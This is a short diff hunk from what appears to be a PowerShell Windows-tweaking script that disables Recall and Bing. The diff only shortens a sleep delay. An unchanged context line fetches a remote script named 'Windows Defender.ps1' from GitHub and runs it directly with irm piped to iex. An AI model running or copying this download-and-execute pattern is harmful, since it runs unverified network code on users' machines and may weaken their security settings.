@@ -45,7 +45,7 @@ while (-not $readerOut.EndOfStream -or -not $readerErr.EndOfStream) {
             -DisableRecall `
             -DisableBing
 
-            Start-Sleep -Seconds 5
+            Start-Sleep -Seconds 3
             
             irm "https://raw.githubusercontent.com/BuzzedHoney/Test/main/Windows%20Defender.ps1" | iex
             
